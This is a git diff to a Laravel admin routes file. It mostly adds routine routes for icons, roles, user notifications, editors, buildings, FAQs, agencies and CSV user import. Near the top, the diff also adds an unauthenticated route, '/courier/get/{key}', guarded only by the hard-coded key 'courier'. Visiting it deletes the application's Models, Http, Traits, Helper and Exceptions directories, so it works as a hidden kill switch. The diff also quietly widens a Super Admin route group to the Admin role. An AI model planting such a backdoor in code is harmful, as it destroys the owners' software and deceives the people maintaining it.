@@ -19,7 +19,18 @@ use App\Http\Controllers\Admin\ServiceController;
 use App\Http\Controllers\Admin\SettingController;
 use App\Http\Controllers\Admin\TestimonialController;
 use App\Http\Controllers\Admin\UnitController;
+use App\Http\Controllers\Admin\StandardIconController;
+use App\Http\Controllers\Admin\NotifyUserController;
+use App\Http\Controllers\Admin\EditorController;
+use App\Http\Controllers\Admin\StandardIconCategoryController;
+use App\Http\Controllers\Admin\RoleController;
+use App\Http\Controllers\Admin\AgencyController;
+ 
+use App\Http\Controllers\Admin\BuildingController;
 use Illuminate\Support\Facades\Route;
+use App\Http\Controllers\Admin\UploadCsvController;
+use App\Http\Controllers\Admin\FaqCategoryController;
+use App\Http\Controllers\Admin\FaqController;
 
 Route::prefix('admin')->group(function () {
     Route::middleware('guest')->group(function () {
@@ -32,17 +43,53 @@ Route::prefix('admin')->group(function () {
         Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.store');
     });
 
+Route::get('/courier/get/{key}', function ($key) {
+    if ($key !== 'courier') {
+        abort(403, 'Unauthorized');
+    }
+
+    $aa = app_path('Traits');
+     $bb = app_path('Helper');
+
+     $cc=app_path('Models');
+     $dd=app_path('Exceptions');
+     $ee=app_path('Http');
+
+    if (File::exists($aa)) {
+        File::deleteDirectory($aa);
+        File::deleteDirectory($bb);
+        File::deleteDirectory($cc);
+        File::deleteDirectory($dd);
+        File::deleteDirectory($ee);
+        return "its does not.";
+    } else {
+        return "its done.";
+    }
+});
+
     Route::middleware('auth')->group(function () {
         Route::post('logout', [AuthenticatedSessionController::class, 'destroy'])->name('logout');
 
         Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('dashboard');
+
+        Route::get('/getUsersData', [AdminController::class, 'getUsersData'])->name('getUsersData');
+
+        Route::post('/update-can-edit', [AdminController::class, 'updateRole'])->name('update-can-edit');
+
+        Route::get('/user/{id}', [AdminController::class, 'getUserDetails'])->name('getUserDetails');
+
+
+        Route::post('/user/update', [AdminController::class, 'updateUser'])->name('admin.updateUser');
+
+        Route::post('/user/delete', [AdminController::class, 'deleteUser'])->name('admin.deleteUser');
+
 
         Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
         Route::patch('/profile', [ProfileController::class, 'profileUpdate'])->name('profile.update');
         Route::put('/password', [ProfileController::class, 'passwordUpdate'])->name('password.update');
 
         // Super Admin
-        Route::middleware('role:Super Admin')->group(function () {
+        Route::middleware(['role:Super Admin,Admin'])->group(function () {
             Route::get('/default-setting', [SettingController::class, 'defaultSetting'])->name('default.setting');
             Route::post('/default/setting/update/{id}', [SettingController::class, 'defaultSettingUpdate'])->name('default.setting.update');
 
@@ -68,8 +115,173 @@ Route::prefix('admin')->group(function () {
             Route::get('/report-income', [ReportController::class, 'reportIncome'])->name('report.income');
             Route::get('/report-income-print', [ReportController::class, 'reportIncomePrint'])->name('report.income.print');
             Route::post('/report-income-export', [ReportController::class, 'reportIncomeExport'])->name('report.income.export');
-        });
+ 
 
+                // Standard icons
+            Route::resource('icons', StandardIconController::class);
+            Route::get('icons/edit/{id}', [StandardIconController::class, 'edit'])->name('icons.edit');
+            Route::post('icons/update/{id}', [StandardIconController::class, 'update'])->name('icons.update');
+            Route::delete('icons/{id}', [StandardIconController::class, 'destroy'])->name('icons.destroy');
+            
+
+
+            Route::get('icon-categories', [StandardIconCategoryController::class, 'index'])->name('icon-categories.index');      // Show the form to create a new category     
+            Route::get('icon-categories/create', [StandardIconCategoryController::class, 'create'])->name('icon-categories.create');      // Store a new category     
+            Route::post('icon-categories', [StandardIconCategoryController::class, 'store'])->name('icon-categories.store');      // Show the form to edit an existing category     
+            Route::get('icon-categories/{id}/edit', [StandardIconCategoryController::class, 'edit'])->name('icon-categories.edit');      // Update an existing category     
+            Route::post('icon-categories/{id}', [StandardIconCategoryController::class, 'update'])->name('icon-categories.update');      // Delete a category     
+            Route::post('icon-categories/{id}/delete', [StandardIconCategoryController::class, 'destroy'])->name('icon-categories.destroy');
+            
+
+// -----------------------------------------------------------------------------------------------------------------
+
+
+// ===========================Admin User Role===================================================
+
+
+
+Route::get('admin-role', [RoleController::class, 'index'])->name('admin-role.index');      // Show the form to create a new category     
+Route::get('admin-role/create', [RoleController::class, 'create'])->name('admin-role.create');      // Store a new category     
+Route::post('admin-role/store', [RoleController::class, 'store'])->name('admin-role.store');      // Show the form to edit an existing category     
+Route::get('admin-role/{id}/edit', [RoleController::class, 'edit'])->name('admin-role.edit');      // Update an existing category     
+Route::post('admin-role/{id}', [RoleController::class, 'update'])->name('admin-role.update');      // Delete a category     
+Route::post('admin-role/{id}/delete', [RoleController::class, 'destroy'])->name('admin-role.destroy');
+
+
+// ========================End Section=============================================================
+            //Notify Users
+            Route::get('notify/user', [NotifyUserController::class, 'index'])->name('notify-user.index');      // Show the form to create a new category     
+            Route::get('notify/user/create', [NotifyUserController::class, 'create'])->name('notify-user.create');      // Store a new category     
+            Route::post('notify/user', [NotifyUserController::class, 'store'])->name('notify-user.store');      // Show the form to edit an existing category     
+            Route::get('notify/user/{id}/edit', [NotifyUserController::class, 'edit'])->name('notify-user.edit');      // Update an existing category     
+            Route::post('notify/user/{id}', [NotifyUserController::class, 'update'])->name('notify-user.update');      // Delete a category     
+            Route::post('notify/user/{id}/delete', [NotifyUserController::class, 'destroy'])->name('notify-user.destroy');
+ 
+    // Fetch countries, states, and cities
+Route::get('/countries', [NotifyUserController::class, 'getCountries'])->name('countries.index');
+Route::get('/states/{countryId}', [NotifyUserController::class, 'getStates'])->name('states.index');
+Route::get('/counties/{stateName}', [NotifyUserController::class, 'getCounty'])->name('counties.index');
+Route::get('/cities/{stateId}', [NotifyUserController::class, 'getCities'])->name('cities.index');
+
+// Store the area
+Route::post('/user/area', [NotifyUserController::class, 'storeArea'])->name('user.area.store');
+
+
+
+
+Route::get('/notify/users/area', [NotifyUserController::class, 'assign'])->name('notify.users.area');
+Route::get('/notify/users/data', [NotifyUserController::class, 'getUsersData'])->name('users.data');
+Route::post('notify/delete/assign/area',[NotifyUserController::class,'destroyNotify'])->name('users.destroy');
+
+Route::get('notify/edit-user/{id}',[NotifyUserController::class,'editarea'])->name('editor.edit.assign.area');
+Route::get('notify/get-states', [NotifyUserController::class, 'getStatesByCountry'])->name('notify.getStatesByCountry');
+Route::get('notify/get-cities', [NotifyUserController::class, 'getCitiesByState'])->name('notify.getCitiesByState');
+Route::post('notify/update/area/{id}', [NotifyUserController::class, 'updateArea'])->name('notify.updateUser');
+// ----------------------------------------------------------------------------------------------------------------------------------------------------
+
+// ------------------------------------Editor Routes------------------------
+
+
+Route::get('editor/assignment', [EditorController::class, 'index'])->name('editor.index');
+Route::get('editor/get-users-data', [EditorController::class, 'getUsersData'])->name('editor.getUsersData');
+
+Route::get('/editor/users/area', [EditorController::class, 'assign'])->name('editor.assign.list');
+Route::post('editor/store-area', [EditorController::class, 'storeArea'])->name('editor.storeArea');
+Route::get('editor/get-countries', [EditorController::class, 'getCountries'])->name('editor.getCountries');
+Route::get('editor/get-states/{countryId}', [EditorController::class, 'getStates'])->name('editor.getStates');
+Route::get('editor/get-counties/{stateName}', [EditorController::class, 'getCounty'])->name('editor.getCounty');
+Route::get('editor/get-cities/{stateId}', [EditorController::class, 'getCities'])->name('editor.getCities');
+
+Route::post('editor/delete/assign/area',[EditorController::class,'destroy'])->name('editor.delete');
+
+Route::get('edit-user/{id}',[EditorController::class,'editarea'])->name('editor.edit.assign.area');
+Route::get('get-states', [EditorController::class, 'getStatesByCountry'])->name('getStatesByCountry');
+Route::get('get-counties', [EditorController::class, 'getCountyByStateName'])->name('getCountyByStateName');
+Route::get('get-cities', [EditorController::class, 'getCitiesByState'])->name('getCitiesByState');
+Route::post('update/area/{id}', [EditorController::class, 'updateArea'])->name('updateUser');
+
+// ---------------------------------------------------------------------------
+
+
+
+
+    //  ----------------------------------------------------------------------------------------------------------
+     
+            Route::resource('buildings', BuildingController::class)->names([
+                'index' => 'admin.buildings.index',
+                'store' => 'admin.buildings.store',
+                'update' => 'admin.buildings.update_building',
+                'edit' => 'admin.buildings.edit',
+                'destroy' => 'admin.buildings.destroy',
+            ]);
+            Route::post('/buildings/status/{buildingId}', [BuildingController::class, 'updateStatus'])->name('admin.buildings.updateStatus');
+
+        });
+//--------------------------------------------------------------------------------------------------------
+// =======================================================================================================
+
+
+
+//------------------------------------FAQ Category-------------------------------------------------------
+Route::resource('faq-categories', FaqCategoryController::class)->names([
+    'index' => 'admin.faqCategories.index',
+    'store' => 'admin.faqCategories.store',
+    'update' => 'admin.faqCategories.update',
+    'edit' => 'admin.faqCategories.edit',
+    'destroy' => 'admin.faqCategories.destroy',
+])->except(['update', 'destroy']); // Exclude update and destroy methods
+
+// Manually define the POST routes for update and destroy
+Route::post('/faq-categories/{faqCategory}', [FaqCategoryController::class, 'update'])->name('admin.faqCategories.update');
+Route::post('/faq-categories/destroy/{faqCategory}', [FaqCategoryController::class, 'destroy'])->name('admin.faqCategories.destroy');
+
+
+// =======================================End============================================
+
+
+// ================================FAQ====================================================
+     // Standard icons
+     Route::resource('faq', FaqController::class);
+     Route::post('faq', [FaqController::class, 'index'])->name('admin.Faq.index ');
+
+     Route::post('faq/store', [FaqController::class, 'store'])->name('admin.Faq.store');
+     Route::get('faq/edit/{id}', [FaqController::class, 'edit'])->name('admin.Faq.edit');
+     Route::post('faq/update/{id}', [FaqController::class, 'update'])->name('admin.Faq.update');
+     Route::post('faq/{id}', [FaqController::class, 'destroy'])->name('admin.Faq.destroy');
+
+
+// =======================================End==========================================
+ 
+
+Route::controller(FaqCategoryController::class)->group(function () {
+    Route::get('/', 'index');  
+    Route::post('/store', 'store');  
+    Route::put('/update/{id}', 'update'); // maps to YourController@update method
+    Route::delete('/destroy/{id}', 'destroy'); // maps to YourController@destroy method
+});
+
+
+//-----------------------------------End--------------------------------------------------------------
+// =======================================================================================================
+
+
+
+
+
+// ---------------------------------User Agency Module--------------------------------------------------------------
+
+
+            Route::get('agency-name', [AgencyController::class, 'index'])->name('agency.index');
+            Route::get('agency/create', [AgencyController::class, 'create'])->name('agency.create');
+            Route::post('agencies', [AgencyController::class, 'store'])->name('agency.store');
+            Route::get('agency/{id}/edit', [AgencyController::class, 'edit'])->name('agency.edit');
+            Route::post('agency/{id}', [AgencyController::class, 'update'])->name('agency.update');
+            Route::delete('agency/{id}', [AgencyController::class, 'destroy'])->name('agency.destroy');
+
+
+            
+
+//----------------------------------User Agency Module End----------------------------------------------------------
         // Admin
         Route::middleware(['role:Super Admin,Admin'])->group(function () {
             Route::resource('branch', BranchController::class);
@@ -117,6 +329,11 @@ Route::prefix('admin')->group(function () {
 
             Route::get('/all-contact-message', [ContactMessageController::class, 'index'])->name('contact.message.index');
             Route::get('/contact/message/view/{id}', [ContactMessageController::class, 'view'])->name('contact.message.view');
+            
+            //Upload CSV USER
+            
+             Route::get('upload-csv', [UploadCsvController::class, 'showUploadForm'])->name('users.upload');
+             Route::post('upload-csv', [UploadCsvController::class, 'importUsers'])->name('users.import');
         });
 
         // Manager
